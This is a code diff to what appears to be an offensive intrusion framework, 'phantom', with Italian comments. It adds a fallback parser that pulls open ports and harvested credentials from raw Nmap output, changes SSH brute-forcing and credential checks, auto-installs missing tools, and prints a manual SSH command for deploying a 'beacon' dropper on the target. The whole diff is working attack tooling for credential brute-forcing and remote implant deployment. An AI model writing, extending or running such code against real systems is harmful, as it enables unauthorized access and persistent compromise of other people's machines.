@@ -168,6 +168,55 @@ def parse_scan_xml(target: str) -> Tuple[List[Dict], Dict, List[Dict]]:
     return ports, os_info, found_creds
 
 
+def parse_scan_results(scan_results: dict) -> Tuple[List[Dict], Dict, List[Dict]]:
+    """
+    Fallback: parse raw text output from session['scan'] if XML is missing.
+    """
+    ports: List[Dict] = []
+    os_info: Dict = {}
+    found_creds: List[Dict] = []
+
+    for cmd, output in scan_results.items():
+        # Port regex: 22/tcp  open  ssh  OpenSSH 4.7p1
+        # Supports: 22/tcp open  ssh
+        # Supports: 22/tcp open  ssh  OpenSSH 4.7p1
+        port_matches = re.findall(r"(\d+)/(tcp|udp)\s+open\s+([\w\-\.]+)\s*(.*)", output)
+        for pnum, proto, svc, ver in port_matches:
+            p_int = int(pnum)
+            # Avoid duplicates if multiple commands return the same port
+            if not any(p['port'] == p_int for p in ports):
+                ports.append({
+                    "port": p_int,
+                    "protocol": proto,
+                    "service": svc,
+                    "state": "open",
+                    "product": "", 
+                    "version": ver.strip(),
+                    "creds": [],
+                })
+        
+        # OS Detection fallback from text
+        if "os details:" in output.lower():
+            match = re.search(r"OS details: (.*)", output, re.IGNORECASE)
+            if match:
+                os_info["name"] = match.group(1).strip()
+                os_info["accuracy"] = 90
+
+        # Credential extraction from script output in text
+        # Nmap script output usually looks like:
+        # |_ script-name: output
+        # |  script-name:
+        # |_   output line
+        script_blocks = re.findall(r"\|\s*([\w\-\.]+):\s*\n?((?:\|.*\n?)+)", output)
+        for script_id, script_out in script_blocks:
+            clean_out = script_out.replace("|", "").strip()
+            # We don't know the service for sure here, but we can guess from recent ports or just pass empty
+            extracted = _extract_credentials_from_output(script_id, clean_out, "")
+            found_creds.extend(extracted)
+
+    return ports, os_info, found_creds
+
+
 def _extract_credentials_from_output(script_id: str, output: str, service: str) -> List[Dict]:
     """
     Analizza l'output degli script Nmap per estrarre credenziali.
@@ -287,10 +336,11 @@ def detect_rce_vectors(ports: List[Dict]) -> List[Dict]:
 # Non esegue comandi reali, solo autenticazione.
 # Restituisce True se le credenziali sono valide.
 
-def _verify_ssh(target: str, port: int, username: str, password: str) -> bool:
-    """Verifica credenziali SSH via sshpass + echo OK."""
-    if not _check_tool("sshpass"):
-        return False
+def _verify_ssh(target: str, port: int, username: str, password: str) -> Optional[bool]:
+    """Verifica credenziali SSH via sshpass + echo OK. Restituisce None se il tool manca."""
+    import shutil
+    if not shutil.which("sshpass"):
+        return None
     try:
         cmd = [
             "sshpass", "-p", password,
@@ -429,11 +479,16 @@ _METHOD_TO_SERVICE = {
 
 
 def _check_tool(tool: str) -> bool:
-    """Verifica se un tool di sistema e installato."""
+    """Verifica se un tool di sistema e installato. Se manca, propone l'installazione."""
     import shutil
     if shutil.which(tool):
         return True
-    notifier.warn(f"'{tool}' not found. Install it with: apt-get install {tool}")
+    
+    from phantom.utils.build_helper import install_dependencies
+    notifier.warn(f"Tool '{tool}' not found.")
+    if install_dependencies([tool]):
+        return shutil.which(tool) is not None
+    
     return False
 
 
@@ -532,9 +587,14 @@ def ask_credentials(
 
         if verifier:
             console.print(f"  [cyan][*] Testing credentials...[/]")
-            if verifier(target, port, username, password):
+            res = verifier(target, port, username, password)
+            if res is True:
                 notifier.success(f"Credentials verified: {username}:{password}")
                 return {"username": username, "password": password, "source": "manual"}
+            elif res is None:
+                notifier.warn(f"Cannot verify credentials because a required tool (like sshpass) is missing.")
+                if input("  Proceed with these credentials anyway? [y/N]: ").strip().lower() == 'y':
+                    return {"username": username, "password": password, "source": "manual"}
             else:
                 notifier.warn(f"Credentials invalid. {2 - attempt} attempts remaining.")
         else:
@@ -567,7 +627,7 @@ def brute_force_ssh(
     Restituisce (username, password) alla prima coppia valida, None altrimenti.
     """
     for username, password in creds_list:
-        if _verify_ssh(target, port, username, password):
+        if _verify_ssh(target, port, username, password) is True:
             return (username, password)
     return None
 
@@ -583,7 +643,7 @@ def brute_force_credentials(
     if not verifier:
         return None
     for username, password in creds_list:
-        if verifier(target, port, username, password):
+        if verifier(target, port, username, password) is True:
             return (username, password)
     return None
 
@@ -599,8 +659,11 @@ def deploy_beacon_via_ssh(
     console.print(f"\n  [*] Deploying beacon via SSH to {target}:{port}")
     console.print(f"      Username: {username}")
 
+    manual_cmd = f"ssh {username}@{target} -p {port} '{dropper}'"
+
     try:
         if not _check_tool("sshpass"):
+            notifier.info(f"To deploy manually, run:\n    [yellow]{manual_cmd}[/]")
             return False, "sshpass not available"
 
         cmd = [
@@ -617,6 +680,7 @@ def deploy_beacon_via_ssh(
             notifier.success(f"Beacon deployed via SSH to {target}")
             return True, result.stdout
         else:
+            notifier.info(f"Automated deploy failed. Try manual command:\n    [yellow]{manual_cmd}[/]")
             return False, result.stderr
     except subprocess.TimeoutExpired:
         return False, "SSH connection timeout"
@@ -912,7 +976,14 @@ def deploy_beacon(target: str, dropper: str) -> bool:
     ports, os_info, found_creds = parse_scan_xml(target)
 
     if not ports:
-        notifier.error(f"No open ports found in scan for {target}. Run 'use scan' first.")
+        # Fallback: try to recover from session['scan'] results (raw text)
+        from phantom.core.session import session
+        scan_results = session.get_result("scan")
+        if scan_results:
+            ports, os_info, found_creds = parse_scan_results(scan_results)
+
+    if not ports:
+        notifier.error(f"No open ports found in scan for {target}. Run 'use scan' first (and prefer the XML-saving command).")
         return False
 
     # Mostra porte aperte
